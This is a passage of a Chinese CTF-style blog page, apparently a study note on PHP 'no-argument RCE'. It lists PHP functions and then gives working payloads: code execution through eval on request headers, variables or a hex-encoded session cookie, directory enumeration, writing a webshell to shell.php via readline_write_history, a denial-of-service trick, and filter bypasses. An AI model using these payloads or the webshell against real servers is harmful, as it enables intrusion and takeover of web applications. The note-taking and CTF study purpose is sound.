+<span class="n">glob</span>
+<span class="n">system</span>
+<span class="n">passthru</span>
+<span class="n">escapeshellcmd</span>
+<span class="n">escapeshellarg</span>
+<span class="n">shell_exec</span>
+<span class="n">proc_nice</span>
+<span class="n">flock</span>
+<span class="n">rewind</span>
+<span class="n">rmdir</span>
+<span class="n">umask</span>
+<span class="n">feof</span>
+<span class="n">fscanf</span>
+<span class="n">fpassthru</span>
+<span class="n">fstat</span>
+<span class="n">ftell</span>
+<span class="n">fflush</span>
+<span class="n">fsync</span>
+<span class="n">fdatasync</span>
+<span class="n">fwrite</span>
+<span class="n">fputs</span>
+<span class="n">copy</span>
+<span class="n">unlink</span>
+<span class="n">fnmatch</span>
+<span class="n">is_writable</span>
+<span class="n">is_writeable</span>
+<span class="n">is_readable</span>
+<span class="n">is_executable</span>
+<span class="n">is_dir</span>
+<span class="n">is_link</span>
+<span class="n">stat</span>
+<span class="n">lstat</span>
+<span class="n">disk_total_space</span>
+<span class="n">disk_free_space</span>
+<span class="n">diskfreespace</span>
+<span class="n">image_type_to_mime_type</span>
+<span class="n">image_type_to_extension</span>
+<span class="n">phpcredits</span>
+<span class="n">iptcembed</span>
+<span class="n">readlink</span>
+<span class="n">abs</span>
+<span class="n">ceil</span>
+<span class="n">floor</span>
+<span class="n">sin</span>
+<span class="n">cos</span>
+<span class="n">tan</span>
+<span class="n">asin</span>
+<span class="n">acos</span>
+<span class="n">atan</span>
+<span class="n">atanh</span>
+<span class="n">sinh</span>
+<span class="n">cosh</span>
+<span class="n">tanh</span>
+<span class="n">asinh</span>
+<span class="n">acosh</span>
+<span class="n">is_finite</span>
+<span class="n">is_infinite</span>
+<span class="n">deg2rad</span>
+<span class="n">rad2deg</span>
+<span class="n">pack</span>
+<span class="n">unpack</span>
+<span class="n">soundex</span>
+<span class="n">stream_filter_remove</span>
+<span class="n">stream_supports_lock</span>
+<span class="n">stream_is_local</span>
+<span class="n">stream_isatty</span>
+<span class="n">floatval</span>
+<span class="n">doubleval</span>
+<span class="n">boolval</span>
+<span class="n">strval</span>
+<span class="n">is_null</span>
+<span class="n">is_resource</span>
+<span class="n">is_bool</span>
+<span class="n">is_long</span>
+<span class="n">is_float</span>
+<span class="n">is_double</span>
+<span class="n">is_numeric</span>
+<span class="n">is_string</span>
+<span class="n">is_object</span>
+<span class="n">is_scalar</span>
+<span class="n">is_iterable</span>
+<span class="n">urlencode</span>
+<span class="n">rawurlencode</span>
+<span class="n">convert_uuencode</span>
+<span class="n">debug_zval_dump</span>
+<span class="n">version_compare</span>
+<span class="n">spl_autoload</span>
+<span class="n">spl_autoload_call</span>
+<span class="n">spl_autoload_extensions</span>
+<span class="n">spl_autoload_unregister</span>
+<span class="n">spl_object_hash</span>
+<span class="n">spl_object_id</span>
+<span class="n">iterator_apply</span>
+<span class="n">sodium_crypto_box_publickey</span>
+<span class="n">sodium_crypto_kx_publickey</span>
+<span class="n">sodium_crypto_pwhash</span>
+<span class="n">sodium_crypto_sign_ed25519_pk_to_curve25519</span>
+<span class="n">sodium_crypto_sign_ed25519_sk_to_curve25519</span>
+<span class="n">sodium_crypto_sign_publickey</span>
+<span class="n">sodium_memzero</span>
+<span class="n">xml_error_string</span>
+<span class="n">jddayofweek</span>
+<span class="n">jdtofrench</span>
+<span class="n">jdtogregorian</span>
+<span class="n">jdtojulian</span>
+<span class="n">jdtounix</span>
+<span class="n">unixtojd</span>
+<span class="n">ctype_alnum</span>
+<span class="n">ctype_alpha</span>
+<span class="n">ctype_digit</span>
+<span class="n">ctype_lower</span>
+<span class="n">ctype_graph</span>
+<span class="n">ctype_punct</span>
+<span class="n">ctype_space</span>
+<span class="n">ctype_upper</span>
+<span class="n">ctype_xdigit</span>
+<span class="n">dom_import_simplexml</span>
+<span class="n">ftp_pwd</span>
+<span class="n">ftp_cdup</span>
+<span class="n">ftp_alloc</span>
+<span class="n">ftp_rawlist</span>
+<span class="n">ftp_systype</span>
+<span class="n">ftp_append</span>
+<span class="n">ftp_quit</span>
+<span class="n">textdomain</span>
+<span class="n">_</span>
+<span class="n">iconv_mime_encode</span>
+<span class="n">collator_create</span>
+<span class="n">collator_sort</span>
+<span class="n">collator_asort</span>
+<span class="n">numfmt_create</span>
+<span class="n">numfmt_format</span>
+<span class="n">grapheme_substr</span>
+<span class="n">grapheme_strstr</span>
+<span class="n">grapheme_stristr</span>
+<span class="n">locale_filter_matches</span>
+<span class="n">locale_canonicalize</span>
+<span class="n">locale_accept_from_http</span>
+<span class="n">normalizer_normalize</span>
+<span class="n">normalizer_is_normalized</span>
+<span class="n">resourcebundle_create</span>
+<span class="n">resourcebundle_locales</span>
+<span class="n">transliterator_create</span>
+<span class="n">transliterator_create_from_rules</span>
+<span class="n">mb_language</span>
+<span class="n">mb_http_input</span>
+<span class="n">mb_http_output</span>
+<span class="n">mb_substitute_character</span>
+<span class="n">mb_strwidth</span>
+<span class="n">mb_convert_encoding</span>
+<span class="n">mb_strtoupper</span>
+<span class="n">mb_strtolower</span>
+<span class="n">mb_convert_variables</span>
+<span class="n">mb_scrub</span>
+<span class="n">mb_chr</span>
+<span class="n">mb_regex_encoding</span>
+<span class="n">mb_ereg</span>
+<span class="n">mb_eregi</span>
+<span class="n">mb_ereg_replace</span>
+<span class="n">mb_eregi_replace</span>
+<span class="n">mb_ereg_replace_callback</span>
+<span class="n">mb_split</span>
+<span class="n">mb_ereg_match</span>
+<span class="n">mysqli_affected_rows</span>
+<span class="n">mysqli_debug</span>
+<span class="n">mysqli_errno</span>
+<span class="n">mysqli_error</span>
+<span class="n">mysqli_error_list</span>
+<span class="n">mysqli_stmt_execute</span>
+<span class="n">mysqli_execute</span>
+<span class="n">mysqli_execute_query</span>
+<span class="n">mysqli_field_tell</span>
+<span class="n">mysqli_free_result</span>
+<span class="n">mysqli_more_results</span>
+<span class="n">mysqli_next_result</span>
+<span class="n">mysqli_num_fields</span>
+<span class="n">mysqli_num_rows</span>
+<span class="n">mysqli_poll</span>
+<span class="n">mysqli_report</span>
+<span class="n">mysqli_query</span>
+<span class="n">mysqli_reap_async_query</span>
+<span class="n">mysqli_stmt_affected_rows</span>
+<span class="n">mysqli_stmt_errno</span>
+<span class="n">mysqli_stmt_error</span>
+<span class="n">mysqli_stmt_error_list</span>
+<span class="n">mysqli_stmt_free_result</span>
+<span class="n">mysqli_stmt_init</span>
+<span class="n">mysqli_stmt_more_results</span>
+<span class="n">mysqli_stmt_next_result</span>
+<span class="n">mysqli_stmt_num_rows</span>
+<span class="n">mysqli_stmt_store_result</span>
+<span class="n">mysqli_stmt_sqlstate</span>
+<span class="n">mysqli_sqlstate</span>
+<span class="n">mysqli_stat</span>
+<span class="n">mysqli_store_result</span>
+<span class="n">mysqli_thread_id</span>
+<span class="n">readline</span>
+<span class="n">readline_add_history</span>
+<span class="n">readline_read_history</span>
+<span class="n">readline_write_history</span>
+<span class="n">shmop_size</span>
+<span class="n">simplexml_import_dom</span>
+<span class="n">is_soap_fault</span>
+<span class="n">msg_remove_queue</span>
+<span class="n">msg_stat_queue</span>
+<span class="n">msg_queue_exists</span>
+<span class="n">shm_remove</span>
+<span class="n">xmlwriter_open_uri</span>
+<span class="n">xmlwriter_end_attribute</span>
+<span class="n">xmlwriter_start_cdata</span>
+<span class="n">xmlwriter_end_cdata</span>
+<span class="n">xmlwriter_end_dtd</span>
+<span class="n">xmlwriter_end_dtd_attlist</span>
+<span class="n">xmlwriter_output_memory</span>
+<span class="n">xmlwriter_flush</span>
+<span class="n">zip_open</span>
+<span class="n">zip_read</span>
+<span class="n">opcache_invalidate</span>
+<span class="n">opcache_is_script_cached</span>
+<span class="n">xdebug_call_class</span>
+<span class="n">xdebug_call_function</span>
+<span class="n">xdebug_call_line</span>
+<span class="n">xdebug_debug_zval</span>
+<span class="n">xdebug_debug_zval_stdout</span>
+<span class="n">xdebug_start_code_coverage</span>
+<span class="n">xdebug_start_function_monitor</span>
+<span class="n">xdebug_start_gcstats</span>
+<span class="n">xdebug_stop_code_coverage</span>
+<span class="n">dl</span>
+</code></pre></div></div>
+<h2 id="apache-函数">apache 函数</h2>
+<p>不同的服务器可能会定义一些特殊的函数可供使用，这些函数无法用 get_defined_functions 来获取。可以查找官方文档：</p>
+<ul>
+  <li><a href="https://www.php.net/manual/en/ref.apache.php">PHP: Apache Functions - Manual</a></li>
+</ul>
+
+<p>Apache 环境中可用的函数如下：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">apache_child_terminate</span> <span class="err">—</span> <span class="nc">Terminate</span> <span class="n">apache</span> <span class="n">process</span> <span class="n">after</span> <span class="n">this</span> <span class="n">request</span>
+<span class="n">apache_get_modules</span> <span class="err">—</span> <span class="nc">Get</span> <span class="n">a</span> <span class="k">list</span> <span class="n">of</span> <span class="n">loaded</span> <span class="nc">Apache</span> <span class="n">modules</span>
+<span class="n">apache_get_version</span> <span class="err">—</span> <span class="nc">Fetch</span> <span class="nc">Apache</span> <span class="n">version</span>
+<span class="n">apache_getenv</span> <span class="err">—</span> <span class="nc">Get</span> <span class="n">an</span> <span class="nc">Apache</span> <span class="n">subprocess_env</span> <span class="n">variable</span>
+<span class="n">apache_lookup_uri</span> <span class="err">—</span> <span class="nc">Perform</span> <span class="n">a</span> <span class="n">partial</span> <span class="n">request</span> <span class="k">for</span> <span class="n">the</span> <span class="n">specified</span> <span class="no">URI</span> <span class="k">and</span> <span class="k">return</span> <span class="n">all</span> <span class="n">info</span> <span class="n">about</span> <span class="n">it</span>
+<span class="n">apache_note</span> <span class="err">—</span> <span class="nc">Get</span> <span class="k">and</span> <span class="n">set</span> <span class="n">apache</span> <span class="n">request</span> <span class="n">notes</span>
+<span class="n">apache_request_headers</span> <span class="err">—</span> <span class="nc">Fetch</span> <span class="n">all</span> <span class="no">HTTP</span> <span class="n">request</span> <span class="n">headers</span>
+<span class="n">apache_response_headers</span> <span class="err">—</span> <span class="nc">Fetch</span> <span class="n">all</span> <span class="no">HTTP</span> <span class="n">response</span> <span class="n">headers</span>
+<span class="n">apache_setenv</span> <span class="err">—</span> <span class="nc">Set</span> <span class="n">an</span> <span class="nc">Apache</span> <span class="n">subprocess_env</span> <span class="n">variable</span>
+<span class="n">getallheaders</span> <span class="err">—</span> <span class="nc">Fetch</span> <span class="n">all</span> <span class="no">HTTP</span> <span class="n">request</span> <span class="n">headers</span>
+<span class="n">virtual</span> <span class="err">—</span> <span class="nc">Perform</span> <span class="n">an</span> <span class="nc">Apache</span> <span class="n">sub</span><span class="o">-</span><span class="n">request</span>
+</code></pre></div></div>
+
+<h2 id="fpm-函数">FPM 函数</h2>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fastcgi_finish_request</span> <span class="err">—</span> <span class="nc">Flushes</span> <span class="n">all</span> <span class="n">response</span> <span class="n">data</span> <span class="n">to</span> <span class="n">the</span> <span class="n">client</span>
+<span class="n">fpm_get_status</span> <span class="err">—</span> <span class="nc">Returns</span> <span class="n">the</span> <span class="n">current</span> <span class="no">FPM</span> <span class="n">pool</span> <span class="n">status</span>
+</code></pre></div></div>
+
+<h1 id="常见-payload">常见 payload</h1>
+<p>下面是一些常见的 payload。</p>
+
+<h2 id="获取环境信息">获取环境信息</h2>
+
+<h3 id="phpinfo">phpinfo()</h3>
+<p>phpinfo()</p>
+
+<h2 id="目录枚举">目录枚举</h2>
+<h3 id="scandir">scandir</h3>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">当前目录</span><span class="err">：</span><span class="nb">highlight_file</span><span class="p">(</span><span class="nb">array_rand</span><span class="p">(</span><span class="nb">array_flip</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()))));</span>
+<span class="n">上级目录文件</span><span class="err">：</span><span class="nb">highlight_file</span><span class="p">(</span><span class="nb">array_rand</span><span class="p">(</span><span class="nb">array_flip</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nb">chdir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">())))))));</span>
+</code></pre></div></div>
+
+<ul>
+  <li>array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</li>
+  <li>dirname(chdir(dirname()))配合切换文件路径</li>
+</ul>
+
+<h2 id="构造外部输入-rce">构造外部输入 RCE</h2>
+<p>题目限制了无法直接传入参数，但我们可以通过别的地方进行输入。</p>
+
+<h3 id="getallheaders">getallheaders</h3>
+<p>getallheaders 函数可以获取所有的请求头，将 payload 写在最后一个请求头中，然后时用下面的 payload 即可任意代码执行。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">eval</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nb">getallheaders</span><span class="p">()));</span>
+</code></pre></div></div>
+
+<h3 id="get_defined_vars">get_defined_vars</h3>
+<p>get_defined_vars 返回由所有已定义变量所组成的数组，会返回<code class="language-plaintext highlighter-rouge">$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值,返回数组顺序为 get-&gt;post-&gt;cookie-&gt;files</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">eval</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nb">current</span><span class="p">(</span><span class="nb">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="n">jiang</span><span class="o">=</span><span class="nb">phpinfo</span><span class="p">();</span>
+</code></pre></div></div>
+
+<h3 id="session_start">session_start</h3>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">show_source</span><span class="p">(</span><span class="nb">session_id</span><span class="p">(</span><span class="nb">session_start</span><span class="p">()));</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nb">session_id</span><span class="p">(</span><span class="nb">session_start</span><span class="p">())))</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="nb">session_id</span><span class="p">(</span><span class="nb">session_start</span><span class="p">()));</span>
+<span class="nb">readfile</span><span class="p">(</span><span class="nb">session_id</span><span class="p">(</span><span class="nb">session_start</span><span class="p">()));</span> <span class="nf">或者readgzfile</span><span class="p">();</span>
+<span class="n">修改cookie</span> <span class="o">:</span> <span class="no">PHPSESSID</span><span class="o">=</span> <span class="n">filename</span>
+
+<span class="k">eval</span><span class="p">(</span><span class="nb">hex2bin</span><span class="p">(</span><span class="nb">session_id</span><span class="p">(</span><span class="nb">session_start</span><span class="p">())));</span>
+<span class="n">抓包传入Cookie</span><span class="o">:</span> <span class="no">PHPSESSID</span><span class="o">=</span><span class="p">(</span><span class="s2">"system('命令')"</span><span class="n">的十六进制</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="文件写入">文件写入</h2>
+<h3 id="readline_write_history">readline_write_history</h3>
+<p>readline_add_history 可以向缓冲区添加内容, 如下的代码可以向缓冲区添加一个 webshell 内容。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print_r(readline_add_history('<span class="cp">&lt;?=</span><span class="sb">`exit`</span><span class="p">;</span><span class="k">echo</span><span class="sb">`$_GET[1]`</span><span class="p">;</span><span class="err">'</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>借助 readline_write_history 函数可以将这些内容写到文件中。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print_r</span><span class="p">(</span><span class="nb">readline_write_history</span><span class="p">(</span><span class="s1">'shell.php'</span><span class="p">));</span>
+</code></pre></div></div>
+<p>上面的 payload 会在当前目录生成一个 shell.php。内容如下：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_HiStOrY_V2_
+<span class="cp">&lt;?=</span><span class="sb">`exit`</span><span class="p">;</span><span class="k">echo</span><span class="sb">`$_GET[1]`</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>除此之外，我们还可以使用 readline_list_history l来查看当前的缓冲区内容：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print_r</span><span class="p">(</span><span class="nb">readline_list_history</span><span class="p">());</span>
+</code></pre></div></div>
+<p>也可以使用 readline_clean_history 来清除缓冲区</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print_r</span><span class="p">(</span><span class="nf">readline_clean_history</span><span class="p">());</span>
+</code></pre></div></div>
+
+<h2 id="拒绝服务">拒绝服务</h2>
+
+<h3 id="readline">readline</h3>
+<p>readline() 满足无参数，可以使得服务卡在终端输入中。</p>
+
+<h1 id="绕过过滤">绕过过滤</h1>
+
+<h2 id="替换输出函数">替换输出函数</h2>
+<p>php 支持输出的函数有很多，之间可以相互替换，下面是一些满足无参数 RCE 场景的函数</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo: 输出一个或多个字符串。
+print: 输出一个字符串。
+printf: 格式化输出字符串。
+sprintf: 返回格式化后的字符串。
+var_dump: 打印变量的相关信息，包括类型和值。
+print_r: 打印变量的相关信息，以更易读的方式显示数组。
+die 或 exit: 输出一条消息并终止脚本的执行。
+error_log: 将错误消息写入错误日志。
+header: 发送一个 HTTP 头信息。回显在头部
+setcookie: 设置 cookie， 回显在 Set-Cookie 头。
+</code></pre></div></div>
+
+<h2 id="数组转字符串">数组转字符串</h2>
+<p>某些时候我们只能通过 echo 来获取输出，此时需要配合将数组转化为字符串才可以输出全部的内容，下面是一些可以将数组转化为字符串的函数</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">json_encode</span>
+<span class="n">serialize</span>
+<span class="n">implode</span>
+<span class="n">join</span>
+<span class="n">var_export</span>
+<span class="n">print_r</span>
+</code></pre></div></div>
+
+<h2 id="替换文件读取函数">替换文件读取函数</h2>
+<p>下面的文件读取函数可以相互替换</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">file_get_contents</span> <span class="c1">// 无回显，需要输出函数配合</span>
+<span class="n">file</span> <span class="c1">// 无回显，需要输出函数配合</span>
+<span class="n">readfile</span>
+<span class="n">highlight_file</span>
+<span class="n">show_source</span>
+<span class="n">php_strip_whitespace</span>
+<span class="n">parse_ini_file</span>
+</code></pre></div></div>
+
+<h2 id="替换命令执行函数">替换命令执行函数</h2>
+
+<h2 id="构造--号">构造 <code class="language-plaintext highlighter-rouge">.</code> 号</h2>
+<p>目录枚举时一般需要构建一个点号，然后使用 scandir 枚举到当前目录。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chr</span><span class="p">(</span><span class="nb">ceil</span><span class="p">(</span><span class="nb">sinh</span><span class="p">(</span><span class="nb">cosh</span><span class="p">(</span><span class="nb">tan</span><span class="p">(</span><span class="nb">floor</span><span class="p">(</span><span class="nb">sqrt</span><span class="p">(</span><span class="nb">floor</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">()))))))));</span>
+<span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">hebrevc</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">()))));</span>
+</code></pre></div></div>
+<p>除了 phpversion 外，zend_version 也可以获取 . 号</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">next</span><span class="p">(</span><span class="nb">str_split</span><span class="p">(</span><span class="nb">zend_version</span><span class="p">()));</span>
+</code></pre></div></div>
+<p>localeconv 函数也可以获取 . 号</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">current</span><span class="p">(</span><span class="nb">localeconv</span><span class="p">());</span>
+</code></pre></div></div>
+
+<h2 id="字符串切分">字符串切分</h2>
+<p>某些时候我们需要获取字符串中的部分内容，比如要获取 php_version 中的 . 号。此时需要用到字符串切分函数</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>str_split
+</code></pre></div></div>
+
+<h1 id="参考">参考</h1>
+<ul>
+  <li><a href="https://xz.aliyun.com/t/9360#toc-6">PHP的无参数RCE - 先知社区</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-06-08T05:49:21+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/python/2023/06/01/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4.html">Pickle 反序列化绕过</a></div><div class="next"><span>NEXT</span><a href="/php/2023/06/08/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8.html">php 反序列化利用</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
